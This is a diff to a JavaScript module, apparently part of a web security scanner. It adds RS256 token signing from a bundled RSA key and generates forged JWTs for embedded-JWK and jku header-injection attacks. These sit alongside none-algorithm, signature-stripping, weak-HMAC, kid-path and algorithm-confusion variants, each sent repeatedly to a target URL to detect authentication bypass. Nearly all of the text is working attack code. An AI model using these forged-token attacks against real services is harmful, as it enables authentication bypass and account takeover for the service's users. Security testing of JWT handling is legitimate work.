@@ -103,6 +103,39 @@
     var headerPart=urlEncode(JSON.stringify(header)), payloadPart=urlEncode(JSON.stringify(payload));
     return headerPart+"."+payloadPart+"."+sign256(headerPart,payloadPart,secret);
   }
+  function integer64url(value) {
+    var raw=decode64(value), output=0n;
+    for(var index=0;index<raw.length;index+=1) output=(output<<8n)|BigInt(raw.charCodeAt(index)&255);
+    return output;
+  }
+  function modularPower(base,exponent,modulus) {
+    var result=1n; base%=modulus;
+    while(exponent>0n){if(exponent&1n) result=(result*base)%modulus; exponent>>=1n; base=(base*base)%modulus;}
+    return result;
+  }
+  function integerBytes(value,length) {
+    var output=new Array(length), index=length-1;
+    while(index>=0){output[index]=Number(value&255n);value>>=8n;index-=1;}
+    if(value!==0n) throw new Error("RSA signature exceeds modulus length");
+    return output;
+  }
+  function rsaTestKey(context) {
+    var raw=context.resources&&context.resources["rsa-test-key"];
+    if(typeof raw!=="string") throw new Error("bundled RSA test key resource is unavailable");
+    var key; try{key=JSON.parse(raw);}catch(_){throw new Error("bundled RSA test key is invalid");}
+    if(!key.n||!key.e||!key.d) throw new Error("bundled RSA test key is incomplete");
+    return key;
+  }
+  function rsaSignedToken(header,payload,key) {
+    var headerPart=urlEncode(JSON.stringify(header)),payloadPart=urlEncode(JSON.stringify(payload)),digest=sha256(bytes(headerPart+"."+payloadPart));
+    var digestInfo=[48,49,48,13,6,9,96,134,72,1,101,3,4,2,1,5,0,4,32].concat(digest),length=decode64(key.n).length;
+    var paddingLength=length-digestInfo.length-3;
+    if(paddingLength<8) throw new Error("bundled RSA test key is too short for RS256");
+    var encoded=[0,1]; while(paddingLength-->0) encoded.push(255); encoded.push(0); encoded=encoded.concat(digestInfo);
+    var message=0n; encoded.forEach(function(value){message=(message<<8n)|BigInt(value);});
+    return headerPart+"."+payloadPart+"."+bytes64url(integerBytes(modularPower(message,integer64url(key.d),integer64url(key.n)),length));
+  }
+  function publicJwk(key){return {kty:"RSA",n:key.n,e:key.e,kid:key.kid,alg:"RS256",use:"sig"};}
   function variants(input, context) {
     var jwt = parsed(input, context), list = [], signature = jwt.pieces[2], enabled = input.tests || ["none", "invalid_signature", "missing_signature", "expired", "no_exp", "weak_hmac", "kid_path"];
     function add(name, header, payload, sig) { if (enabled.indexOf(name) !== -1) list.push({ name: name, token: token(header, payload, sig) }); }
@@ -133,7 +166,18 @@
       var confusionHeader=Object.assign({},jwt.header,{alg:"HS256"}), confusionPayload=Object.assign({},jwt.payload,claimOverrides);
       list.push({name:"algorithm_confusion",token:signedToken(confusionHeader,confusionPayload,String(input.server_public_key))});
     }
-    if (input.prebuilt_tokens) ["embedded_jwk","jku","x5u"].forEach(function(name){ if(enabled.indexOf(name)!==-1 && typeof input.prebuilt_tokens[name]==="string" && input.prebuilt_tokens[name].split(".").length===3) list.push({name:name,token:input.prebuilt_tokens[name]}); });
+    var nativeEmbedded=enabled.indexOf("embedded_jwk")!==-1 && !(input.prebuilt_tokens&&input.prebuilt_tokens.embedded_jwk);
+    var nativeJku=enabled.indexOf("jku")!==-1 && input.jku_url && !(input.prebuilt_tokens&&input.prebuilt_tokens.jku);
+    var rsaKey=nativeEmbedded||nativeJku?rsaTestKey(context):null;
+    if(rsaKey && nativeEmbedded){
+      var jwkHeader=Object.assign({},jwt.header,{alg:"RS256",jwk:publicJwk(rsaKey)}); delete jwkHeader.jku;delete jwkHeader.x5u;delete jwkHeader.kid;
+      list.push({name:"embedded_jwk",token:rsaSignedToken(jwkHeader,Object.assign({},jwt.payload,claimOverrides),rsaKey)});
+    }
+    if(rsaKey && nativeJku){
+      var jkuHeader=Object.assign({},jwt.header,{alg:"RS256",jku:String(input.jku_url),kid:rsaKey.kid}); delete jkuHeader.jwk;delete jkuHeader.x5u;
+      list.push({name:"jku",token:rsaSignedToken(jkuHeader,Object.assign({},jwt.payload,claimOverrides),rsaKey)});
+    }
+    if (input.prebuilt_tokens) ["embedded_jwk","jku","x5u"].forEach(function(name){ if(enabled.indexOf(name)!==-1 && !list.some(function(item){return item.name===name;}) && typeof input.prebuilt_tokens[name]==="string" && input.prebuilt_tokens[name].split(".").length===3) list.push({name:name,token:input.prebuilt_tokens[name]}); });
     return list.slice(0, 20);
   }
   function operation(id, baseId, located, replacement, targetUrl) {
@@ -149,7 +193,7 @@
       for (var repeat = 0; repeat < 2; repeat += 1) operations.push(operation("baseline-" + repeat, context.base_exchange.exchange_id, jwt.located, jwt.located.token, targetUrl));
       variants(input, context).forEach(function (variant, index) { for (var repeat = 0; repeat < 2; repeat += 1) operations.push(operation("variant-" + index + "-" + repeat, context.base_exchange.exchange_id, jwt.located, variant.token, targetUrl)); });
     }
-    return { operations: operations, result: { token_location: jwt.located.kind, algorithm: jwt.header.alg || null, weak_hmac_secret_found: !!weakSecret(input, context, jwt), active_variants: input.active === false ? [] : variants(input, context).map(function (item) { return item.name; }), target_url: targetUrl, explicit_success_oracle: !!input.success } };
+    return { operations: operations, result: { token_location: jwt.located.kind, algorithm: jwt.header.alg || null, weak_hmac_secret_found: !!weakSecret(input, context, jwt), active_variants: input.active === false ? [] : variants(input, context).map(function (item) { return item.name; }), target_url: targetUrl, explicit_success_oracle: !!input.success, bundled_jwks_resource: "rsa-test-jwks" } };
   }
   function byId(items) { var out = {}; items.forEach(function (item) { out[item.id] = item; }); return out; }
   function responseText(item) { return item && item.response_body_base64 ? decode64(item.response_body_base64) : String(item && item.response_preview && item.response_preview.text || ""); }
